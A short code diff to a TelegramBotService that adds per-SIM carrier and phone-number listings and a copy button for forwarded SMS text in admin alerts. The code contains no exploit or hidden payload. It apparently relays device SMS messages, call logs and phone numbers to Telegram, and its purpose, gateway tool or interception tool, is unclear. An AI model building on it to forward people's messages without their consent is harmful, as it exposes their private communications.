@@ -1127,7 +1127,12 @@ export class TelegramBotService {
             message += `   ID: \`${device.id.substring(0, 8)}\`\n`;
             const simCards = device.simCards || [];
             if (simCards.length > 0) {
-                message += `   SIM: ${simCards.map((s: any) => escapeMarkdown(s.carrierName || 'Unknown')).join(', ')}\n`;
+                message += `   📶 *SIMs:*\n`;
+                simCards.forEach((sim: any, i: number) => {
+                    const carrier = escapeMarkdown(sim.carrierName || 'Unknown');
+                    const phone = sim.phoneNumber ? escapeMarkdown(sim.phoneNumber) : 'N/A';
+                    message += `      SIM ${i + 1}: ${carrier} (${phone})\n`;
+                });
             }
         }
         message += `\n`;
@@ -1143,7 +1148,11 @@ export class TelegramBotService {
         const timestamp = new Date(sms.timestamp).toLocaleString();
         message += `🕐 ${timestamp}`;
 
-        await this.sendToAllAdmins(message);
+        await this.sendToAllAdmins(message, {
+            reply_markup: {
+                inline_keyboard: [[{ text: '📋 Copy Message', copy_text: { text: sms.message } }]]
+            }
+        });
     }
 
     async notifyNewCall(deviceName: string, call: CallLog): Promise<void> {
